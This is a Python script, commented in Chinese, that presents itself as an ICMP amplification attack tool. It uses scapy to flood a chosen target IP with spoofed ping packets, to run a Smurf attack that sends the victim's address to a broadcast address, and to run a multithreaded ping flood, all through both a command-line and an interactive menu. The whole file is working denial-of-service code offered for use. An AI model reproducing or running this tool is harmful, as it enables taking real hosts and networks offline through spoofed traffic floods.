#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ICMP放大攻击工具
利用ICMP协议的特性实现流量放大攻击
"""

import socket
import struct
import time
import threading
import random
import argparse
from scapy.all import *
import sys

class ICMPAmplification:
    def __init__(self):
        self.running = False
        self.threads = []
        self.packet_count = 0
        self.bytes_sent = 0
        
    def create_amplification_packet(self, target_ip, source_ip=None, payload_size=1024):
        """创建放大数据包"""
        # 生成随机载荷
        payload = b'X' * payload_size
        
        # 使用伪造的源IP地址
        if not source_ip:
            # 生成随机源IP (在本地网络范围内)
            base_ip = ".".join(target_ip.split(".")[:-1])
            source_ip = f"{base_ip}.{random.randint(2, 254)}"
        
        # 构造ICMP Echo Request包 (ping请求)
        icmp_packet = (
            IP(src=source_ip, dst=target_ip) /
            ICMP(type=8, code=0) /  # Echo Request
            Raw(load=payload)
        )
        
        return icmp_packet
    
    def send_amplification_attack(self, target_ip, packet_size=1024, packets_per_second=100, duration=None):
        """发送放大攻击"""
        start_time = time.time()
        packet_count = 0
        
        print(f"[*] 开始ICMP放大攻击: {target_ip}")
        print(f"[*] 包大小: {packet_size} 字节")
        print(f"[*] 发送速率: {packets_per_second} 包/秒")
        
        while self.running:
            try:
                # 检查持续时间限制
                if duration and (time.time() - start_time) > duration:
                    break
                
                # 发送放大包
                packet = self.create_amplification_packet(target_ip, payload_size=packet_size)
                send(packet, verbose=0)
                
                packet_count += 1
                self.packet_count += 1
                self.bytes_sent += len(packet)
                
                # 显示进度
                if packet_count % 100 == 0:
                    elapsed = time.time() - start_time
                    rate = packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] 已发送: {packet_count} 包, 速率: {rate:.1f} 包/秒")
                
                # 控制发送速率
                time.sleep(1.0 / packets_per_second)
                
            except Exception as e:
                print(f"[!] 发送错误: {e}")
                time.sleep(1)
        
        print(f"[+] 攻击完成: 共发送 {packet_count} 个包")
    
    def smurf_attack(self, target_ip, network_broadcast, interface=None):
        """Smurf攻击 - 经典的ICMP放大攻击"""
        print(f"[*] 启动Smurf攻击: {target_ip} -> {network_broadcast}")
        
        # 构造Smurf攻击包
        # 发送到广播地址，源IP设置为目标IP，使所有主机回复到目标
        smurf_packet = (
            IP(src=target_ip, dst=network_broadcast) /
            ICMP(type=8, code=0) /
            Raw(load=b'X' * 64)  # 标准ping载荷
        )
        
        while self.running:
            try:
                if interface:
                    sendp(smurf_packet, iface=interface, verbose=0)
                else:
                    send(smurf_packet, verbose=0)
                
                self.packet_count += 1
                
                # 控制发送频率
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[!] Smurf攻击错误: {e}")
                time.sleep(1)
    
    def ping_flood(self, target_ip, packet_size=1024):
        """Ping洪水攻击"""
        print(f"[*] 启动Ping洪水攻击: {target_ip}")
        
        while self.running:
            try:
                # 发送大量ping请求
                packet = (
                    IP(dst=target_ip) /
                    ICMP(type=8, code=0) /
                    Raw(load=b'X' * packet_size)
                )
                
                send(packet, verbose=0)
                self.packet_count += 1
                
                # 高速发送，不等待回复
                # 注意：这可能会被目标系统限制
                
            except Exception as e:
                print(f"[!] Ping洪水攻击错误: {e}")
                time.sleep(0.1)
    
    def start_amplification_attack(self, target_ip, attack_type="standard", **kwargs):
        """启动放大攻击"""
        self.running = True
        self.packet_count = 0
        self.bytes_sent = 0
        
        if attack_type == "standard":
            thread = threading.Thread(
                target=self.send_amplification_attack, 
                args=(target_ip,),
                kwargs=kwargs
            )
        elif attack_type == "smurf":
            thread = threading.Thread(
                target=self.smurf_attack,
                args=(target_ip, kwargs.get('network_broadcast'), kwargs.get('interface'))
            )
        elif attack_type == "ping_flood":
            thread = threading.Thread(
                target=self.ping_flood,
                args=(target_ip, kwargs.get('packet_size', 1024))
            )
        else:
            print(f"[!] 未知攻击类型: {attack_type}")
            return
        
        thread.daemon = True
        thread.start()
        self.threads.append(thread)
        
        print(f"[*] {attack_type} 攻击已启动")
    
    def start_multi_thread_attack(self, target_ip, thread_count=5, **kwargs):
        """启动多线程攻击"""
        self.running = True
        print(f"[*] 启动 {thread_count} 线程ICMP放大攻击")
        
        for i in range(thread_count):
            thread = threading.Thread(
                target=self.send_amplification_attack,
                args=(target_ip,),
                kwargs=kwargs
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def stop_attack(self):
        """停止攻击"""
        print("[*] 停止ICMP放大攻击")
        self.running = False
        
        # 等待线程结束
        for thread in self.threads:
            thread.join(timeout=2)
        
        self.threads.clear()
        
        print(f"[+] 攻击已停止")
        print(f"[+] 统计: {self.packet_count} 包, {self.bytes_sent} 字节")

# 辅助函数
def get_network_broadcast(ip_address, subnet_mask="255.255.255.0"):
    """计算网络广播地址"""
    try:
        # 将IP和掩码转换为整数
        ip_int = struct.unpack(">I", socket.inet_aton(ip_address))[0]
        mask_int = struct.unpack(">I", socket.inet_aton(subnet_mask))[0]
        
        # 计算网络地址和广播地址
        network_int = ip_int & mask_int
        broadcast_int = network_int | (~mask_int & 0xFFFFFFFF)
        
        # 转换回IP地址格式
        broadcast_ip = socket.inet_ntoa(struct.pack(">I", broadcast_int))
        return broadcast_ip
    except:
        return None

def main():
    parser = argparse.ArgumentParser(description='ICMP放大攻击工具')
    parser.add_argument('-t', '--target', required=True, help='目标IP地址')
    parser.add_argument('-a', '--attack-type', choices=['standard', 'smurf', 'ping_flood'], 
                       default='standard', help='攻击类型')
    parser.add_argument('-s', '--size', type=int, default=1024, help='包大小 (字节)')
    parser.add_argument('-r', '--rate', type=int, default=100, help='发送速率 (包/秒)')
    parser.add_argument('-d', '--duration', type=int, help='持续时间 (秒)')
    parser.add_argument('-n', '--threads', type=int, default=1, help='线程数量')
    parser.add_argument('-b', '--broadcast', help='广播地址 (用于Smurf攻击)')
    parser.add_argument('-i', '--interface', help='网络接口')
    
    args = parser.parse_args()
    
    tool = ICMPAmplification()
    
    try:
        if args.attack_type == "smurf":
            # 对于Smurf攻击，需要广播地址
            if not args.broadcast:
                # 自动计算广播地址
                args.broadcast = get_network_broadcast(args.target)
                if not args.broadcast:
                    print("[!] 无法计算广播地址，请使用 -b 参数指定")
                    return
            
            tool.start_amplification_attack(
                args.target, 
                "smurf",
                network_broadcast=args.broadcast,
                interface=args.interface
            )
        else:
            if args.threads > 1:
                tool.start_multi_thread_attack(
                    args.target,
                    thread_count=args.threads,
                    packet_size=args.size,
                    packets_per_second=args.rate,
                    duration=args.duration
                )
            else:
                tool.start_amplification_attack(
                    args.target,
                    args.attack_type,
                    packet_size=args.size,
                    packets_per_second=args.rate,
                    duration=args.duration
                )
        
        print("[*] 攻击进行中... 按Ctrl+C停止")
        
        # 显示实时统计
        def show_stats():
            while tool.running:
                elapsed = time.time() - getattr(tool, '_start_time', time.time())
                rate = tool.packet_count / elapsed if elapsed > 0 else 0
                print(f"[*] 实时统计: {tool.packet_count} 包, 速率: {rate:.1f} 包/秒")
                time.sleep(5)
        
        tool._start_time = time.time()
        stats_thread = threading.Thread(target=show_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # 等待用户中断
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        tool.stop_attack()

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║           ICMP放大攻击工具             ║
    ║       午安午安啦～小心使用哦！          ║
    ╚═══════════════════════════════════════╝
    """)
    
    if len(sys.argv) == 1:
        # 交互模式
        tool = ICMPAmplification()
        
        print("\n=== ICMP放大攻击工具 ===")
        print("1. 标准ICMP放大攻击")
        print("2. Smurf攻击")
        print("3. Ping洪水攻击")
        print("4. 多线程攻击")
        print("0. 退出")
        
        while True:
            try:
                choice = input("\n请选择攻击模式: ").strip()
                
                if choice == '0':
                    break
                elif choice == '1':
                    target_ip = input("请输入目标IP: ").strip()
                    packet_size = int(input("包大小 (默认1024): ") or "1024")
                    rate = int(input("发送速率/秒 (默认100): ") or "100")
                    
                    tool.start_amplification_attack(
                        target_ip, "standard",
                        packet_size=packet_size,
                        packets_per_second=rate
                    )
                    input("按Enter键停止攻击...")
                    tool.stop_attack()
                elif choice == '2':
                    target_ip = input("请输入目标IP: ").strip()
                    broadcast = input("请输入广播地址 (留空自动计算): ").strip()
                    if not broadcast:
                        broadcast = get_network_broadcast(target_ip)
                        print(f"[*] 计算得到广播地址: {broadcast}")
                    
                    tool.start_amplification_attack(
                        target_ip, "smurf",
                        network_broadcast=broadcast
                    )
                    input("按Enter键停止攻击...")
                    tool.stop_attack()
                elif choice == '3':
                    target_ip = input("请输入目标IP: ").strip()
                    packet_size = int(input("包大小 (默认1024): ") or "1024")
                    
                    tool.start_amplification_attack(
                        target_ip, "ping_flood",
                        packet_size=packet_size
                    )
                    input("按Enter键停止攻击...")
                    tool.stop_attack()
                elif choice == '4':
                    target_ip = input("请输入目标IP: ").strip()
                    threads = int(input("线程数量 (默认5): ") or "5")
                    packet_size = int(input("包大小 (默认1024): ") or "1024")
                    rate = int(input("每线程速率/秒 (默认50): ") or "50")
                    
                    tool.start_multi_thread_attack(
                        target_ip,
                        thread_count=threads,
                        packet_size=packet_size,
                        packets_per_second=rate
                    )
                    input("按Enter键停止攻击...")
                    tool.stop_attack()
                else:
                    print("无效的选择")
                    
            except KeyboardInterrupt:
                print("\n[*] 退出程序")
                break
            except Exception as e:
                print(f"错误: {e}")
    else:
        # 命令行模式
        main()